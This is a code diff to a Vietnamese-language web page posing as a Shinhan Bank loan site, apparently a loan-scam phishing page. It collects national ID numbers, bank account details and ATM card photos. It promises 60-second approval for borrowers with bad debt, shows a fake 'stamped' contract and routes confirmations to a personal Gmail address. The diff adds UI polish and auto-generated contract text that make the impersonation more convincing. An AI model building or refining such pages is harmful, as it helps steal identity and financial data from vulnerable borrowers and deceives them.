@@ -43,6 +43,11 @@
             color: white;
             cursor: pointer;
             display: block;
+            transition: transform 0.3s ease;
+        }
+
+        header .hamburger.active {
+            transform: rotate(90deg);
         }
 
         header nav {
@@ -53,6 +58,7 @@
             width: 100%;
             background: #003087;
             padding: 10px 0;
+            transition: all 0.3s ease;
         }
 
         header nav.active {
@@ -128,6 +134,7 @@
             padding: 10px;
             border-radius: 10px;
             text-align: center;
+            transition: all 0.3s ease;
         }
 
         .category-card img {
@@ -174,6 +181,11 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
+            transition: background 0.3s ease;
+        }
+
+        .section-toggle:hover {
+            background: #f8f9fa;
         }
 
         .section-toggle h3 {
@@ -184,6 +196,7 @@
         .section-toggle .arrow {
             font-size: 16px;
             color: #005670;
+            transition: transform 0.3s ease;
         }
 
         .section-toggle.active .arrow {
@@ -196,6 +209,7 @@
             padding: 15px;
             margin-bottom: 10px;
             border-radius: 8px;
+            transition: all 0.3s ease;
         }
 
         .section-content.active {
@@ -264,6 +278,18 @@
             font-size: 12px;
         }
 
+        .loan-card .details {
+            display: none;
+            margin-top: 10px;
+            padding: 10px;
+            background: #fff;
+            border-radius: 5px;
+        }
+
+        .loan-card .details.active {
+            display: block;
+        }
+
         /* Loan Intro */
         .loan-intro {
             text-align: center;
@@ -302,6 +328,40 @@
             width: 100%;
             max-width: 250px;
             border-radius: 8px;
+        }
+
+        .contract-display #contract-content {
+            margin-top: 15px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        /* Support Buttons */
+        .support-buttons {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .support-btn {
+            background: #003087;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 18px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         /* Modal */
@@ -360,6 +420,22 @@
             border-radius: 5px;
             cursor: pointer;
             font-size: 14px;
+        }
+
+        .modal-content .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #003087;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         /* Footer */
@@ -462,6 +538,7 @@
             const nav = document.querySelector('header nav');
             hamburger.addEventListener('click', () => {
                 nav.classList.toggle('active');
+                hamburger.classList.toggle('active');
             });
 
             // Toggle Sections
@@ -482,8 +559,20 @@
             // Toggle Categories
             const categoryCards = document.querySelectorAll('.category-card');
             categoryCards.forEach(card => {
-                card.addEventListener('click', () => {
-                    card.classList.toggle('active');
+                card.addEventListener('click', (e) => {
+                    if (!e.target.closest('.sub-items')) {
+                        card.classList.toggle('active');
+                    }
+                });
+            });
+
+            // Loan Details Toggle
+            const detailButtons = document.querySelectorAll('.loan-card button');
+            detailButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const details = button.parentElement.querySelector('.details');
+                    details.classList.toggle('active');
+                    button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Tìm hiểu';
                 });
             });
 
@@ -509,26 +598,82 @@
                 resultDiv.innerHTML = `Thanh toán hàng tháng: ${monthlyPayment.toFixed(0)} VNĐ<br>Tổng tiền: ${totalPayment.toFixed(0)} VNĐ`;
             });
 
-            // Registration Form
+            // Registration Form Validation and Submission
             const registerButton = document.querySelector('#register-form .section-content button');
             registerButton.addEventListener('click', (e) => {
                 e.preventDefault();
+                const email = document.querySelector('#register-form input[type="email"]').value;
+                const loanAmount = parseFloat(document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value);
+
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    alert('Vui lòng nhập email hợp lệ!');
+                    return;
+                }
+
+                if (isNaN(loanAmount) || loanAmount <= 0) {
+                    alert('Số tiền vay phải lớn hơn 0!');
+                    return;
+                }
+
                 document.querySelector('#confirm-modal').style.display = 'flex';
             });
 
-            // Confirm Form
+            // Confirm Form with Loading and Contract Generation
             const confirmButton = document.querySelector('#confirm-modal button');
             confirmButton.addEventListener('click', () => {
-                document.querySelector('#confirm-modal').style.display = 'none';
-                document.querySelector('.contract-display').classList.add('active');
-                alert('Email gửi đến ThuyTrangEly318@gmail.com: "Đăng ký vay thành công. Vui lòng kiểm tra hợp đồng trong hệ thống."');
-                alert('SMS: "Shinhan Bank: Đăng ký vay thành công. Kiểm tra hợp đồng tại website."');
+                const loader = document.querySelector('#confirm-modal .loader');
+                loader.style.display = 'block';
+                confirmButton.disabled = true;
+
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    confirmButton.disabled = false;
+                    document.querySelector('#confirm-modal').style.display = 'none';
+                    document.querySelector('.contract-display').classList.add('active');
+
+                    // Auto-fill contract
+                    const customerName = document.querySelector('#register-form input[placeholder="Họ và tên"]').value;
+                    const customerId = document.querySelector('#register-form input[placeholder="CCCD/CMND"]').value;
+                    const loanAmount = document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value;
+                    const loanTerm = document.querySelector('#register-form input[placeholder="Thời hạn vay (tháng)"]').value;
+                    const loanType = document.querySelector('#register-form select').value;
+
+                    const contractContent = document.querySelector('#contract-content');
+                    contractContent.innerHTML = `
+                        <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK</h3>
+                        <p><strong>Số hợp đồng:</strong> SHB-${Date.now()}</p>
+                        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
+                        <p><strong>Bên vay:</strong> ${customerName}</p>
+                        <p><strong>CCCD/CMND:</strong> ${customerId}</p>
+                        <p><strong>Số tiền vay:</strong> ${loanAmount} VNĐ</p>
+                        <p><strong>Thời hạn vay:</strong> ${loanTerm} tháng</p>
+                        <p><strong>Loại vay:</strong> ${loanType}</p>
+                        <p><strong>Lãi suất:</strong> 8%/năm (tính trên dư nợ giảm dần)</p>
+                        <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn theo lịch trả nợ. Phí tất toán trước hạn: 3% dư nợ gốc nếu trong 3 năm đầu, 0% từ năm thứ 4 trở đi.</p>
+                        <p><strong>Đại diện Shinhan Bank:</strong> [Chữ ký và con dấu]</p>
+                    `;
+
+                    alert('Email gửi đến ThuyTrangEly318@gmail.com: "Đăng ký vay thành công. Vui lòng kiểm tra hợp đồng trong hệ thống."');
+                    alert('SMS: "Shinhan Bank: Đăng ký vay thành công. Kiểm tra hợp đồng tại website."');
+                }, 2000);
             });
 
             // No Card Guide
             const noCardLink = document.querySelector('.no-card');
             noCardLink.addEventListener('click', () => {
                 alert('Để xem số thẻ, đăng nhập ứng dụng ngân hàng hoặc liên hệ chi nhánh. Nếu chưa có thẻ, vui lòng đến Shinhan Bank để phát hành.');
+            });
+
+            // Support Buttons
+            const callButton = document.querySelector('.support-btn.call');
+            callButton.addEventListener('click', () => {
+                window.location.href = 'tel:19001577';
+            });
+
+            const chatButton = document.querySelector('.support-btn.chat');
+            chatButton.addEventListener('click', () => {
+                alert('Chức năng chat đang được phát triển. Vui lòng gọi hotline 1900 1577 để được hỗ trợ!');
             });
         });
     </script>
@@ -562,13 +707,13 @@
             <p>Sở hữu nguồn vốn mơ ước với lãi suất thấp, chi phí rõ ràng, đặc biệt hỗ trợ khách hàng có nợ xấu!</p>
             <button onclick="document.querySelector('#register-form .section-toggle').click()">TÌM HIỂU THÊM</button>
         </div>
-        <img src="banner-image.jpg" alt="Banner Image">
+        <img src="banner-image.jpg" alt="Banner Image" loading="lazy">
     </section>
 
     <!-- Categories -->
     <section class="categories">
         <div class="category-card">
-            <img src="personal-icon.jpg" alt="Cá Nhân">
+            <img src="personal-icon.jpg" alt="Cá Nhân" loading="lazy">
             <h4>CÁ NHÂN</h4>
             <div class="sub-items">
                 <a href="#loan-packages">Khoản Vay Tiêu Dùng</a>
@@ -577,7 +722,7 @@
             </div>
         </div>
         <div class="category-card">
-            <img src="business-icon.jpg" alt="Doanh Nghiệp">
+            <img src="business-icon.jpg" alt="Doanh Nghiệp" loading="lazy">
             <h4>DOANH NGHIỆP</h4>
             <div class="sub-items">
                 <a href="#">Vay Vốn Kinh Doanh</a>
@@ -586,7 +731,7 @@
             </div>
         </div>
         <div class="category-card">
-            <img src="card-icon.jpg" alt="Thẻ">
+            <img src="card-icon.jpg" alt="Thẻ" loading="lazy">
             <h4>THẺ</h4>
             <div class="sub-items">
                 <a href="#">Thẻ Tín Dụng</a>
@@ -605,36 +750,48 @@
         </div>
         <div class="section-content">
             <div class="loan-card">
-                <img src="car-icon.png" alt="Car">
+                <img src="car-icon.png" alt="Car" loading="lazy">
                 <div>
                     <h4>Vay Mua Xe</h4>
                     <p>Lãi suất từ 6.5%/năm, hạn mức 500M</p>
                 </div>
                 <button>Tìm hiểu</button>
+                <div class="details">
+                    <p>Lãi suất: 6.5%/năm<br>Hạn mức: 500 triệu<br>Thời hạn: 60 tháng<br>Điều kiện: Thu nhập từ 7.2 triệu/tháng, không nợ xấu</p>
+                </div>
             </div>
             <div class="loan-card">
-                <img src="house-icon.png" alt="House">
+                <img src="house-icon.png" alt="House" loading="lazy">
                 <div>
                     <h4>Vay Mua Nhà</h4>
                     <p>Lãi suất từ 7%/năm, hạn mức 2T</p>
                 </div>
                 <button>Tìm hiểu</button>
+                <div class="details">
+                    <p>Lãi suất: 7%/năm<br>Hạn mức: 2 tỷ<br>Thời hạn: 30 năm<br>Điều kiện: Có tài sản đảm bảo, thu nhập ổn định</p>
+                </div>
             </div>
             <div class="loan-card">
-                <img src="cash-icon.png" alt="Cash">
+                <img src="cash-icon.png" alt="Cash" loading="lazy">
                 <div>
                     <h4>Vay Tín Chấp</h4>
                     <p>Lãi suất từ 8%/năm, hạn mức 300M</p>
                 </div>
                 <button>Tìm hiểu</button>
+                <div class="details">
+                    <p>Lãi suất: 8%/năm<br>Hạn mức: 300 triệu<br>Thời hạn: 60 tháng<br>Điều kiện: Thu nhập từ 4 triệu/tháng, không nợ xấu</p>
+                </div>
             </div>
             <div class="loan-card">
-                <img src="repair-icon.png" alt="Repair">
+                <img src="repair-icon.png" alt="Repair" loading="lazy">
                 <div>
                     <h4>Vay Sửa Nhà</h4>
                     <p>Lãi suất từ 7.5%/năm, hạn mức 200M</p>
                 </div>
                 <button>Tìm hiểu</button>
+                <div class="details">
+                    <p>Lãi suất: 7.5%/năm<br>Hạn mức: 200 triệu<br>Thời hạn: 60 tháng<br>Điều kiện: Thu nhập từ 7.2 triệu/tháng, không nợ xấu</p>
+                </div>
             </div>
         </div>
 
@@ -716,12 +873,45 @@
             <input type="text" placeholder="Nghề nghiệp">
             <input type="text" placeholder="Công ty">
             <input type="text" placeholder="Số tài khoản nhận tiền">
-            <select>
+            <select id="bank-select">
                 <option>Ngân hàng nhận tiền</option>
                 <option>Shinhan Bank</option>
                 <option>TPBank</option>
                 <option>Vietcombank</option>
                 <option>Techcombank</option>
+                <option>Agribank</option>
+                <option>BIDV</option>
+                <option>VietinBank</option>
+                <option>MB Bank</option>
+                <option>VPBank</option>
+                <option>Sacombank</option>
+                <option>ACB</option>
+                <option>SCB</option>
+                <option>Eximbank</option>
+                <option>HDBank</option>
+                <option>OCB</option>
+                <option>MSB</option>
+                <option>SeABank</option>
+                <option>SHB</option>
+                <option>LienVietPostBank</option>
+                <option>VIB</option>
+                <option>Nam A Bank</option>
+                <option>PVcomBank</option>
+                <option>ABBANK</option>
+                <option>BaoViet Bank</option>
+                <option>KienlongBank</option>
+                <option>VietBank</option>
+                <option>PG Bank</option>
+                <option>DongA Bank</option>
+                <option>NCB</option>
+                <option>VietA Bank</option>
+                <option>Co-opBank</option>
+                <option>Standard Chartered</option>
+                <option>HSBC</option>
+                <option>Citibank</option>
+                <option>ANZ</option>
+                <option>Woori Bank</option>
+                <option>KEB Hana Bank</option>
             </select>
             <input type="text" placeholder="Mục đích vay">
             <button>Gửi Đăng Ký</button>
@@ -732,7 +922,8 @@
     <section class="contract-display">
         <h2>Hợp Đồng Đăng Ký Vay</h2>
         <p>Hồ sơ của bạn đã được xác nhận với con dấu Shinhan Bank.</p>
-        <img src="contract-stamped.jpg" alt="Hợp đồng có con dấu">
+        <div id="contract-content"></div>
+        <img src="contract-stamped.jpg" alt="Hợp đồng có con dấu" loading="lazy">
     </section>
 
     <!-- Loan Intro -->
@@ -740,6 +931,12 @@
         <h2>Giới Thiệu Khoản Vay</h2>
         <p>Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây. Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
     </section>
+
+    <!-- Support Buttons -->
+    <div class="support-buttons">
+        <button class="support-btn call" title="Gọi Hotline">📞</button>
+        <button class="support-btn chat" title="Chat Trực Tiếp">💬</button>
+    </div>
 
     <!-- Footer -->
     <footer>
@@ -756,6 +953,7 @@
             <input type="file" accept="image/*" placeholder="Ảnh thẻ ATM">
             <p class="no-card">Không có thẻ ATM? Xem hướng dẫn</p>
             <button>Xác nhận</button>
+            <div class="loader"></div>
         </div>
     </div>
 </body>
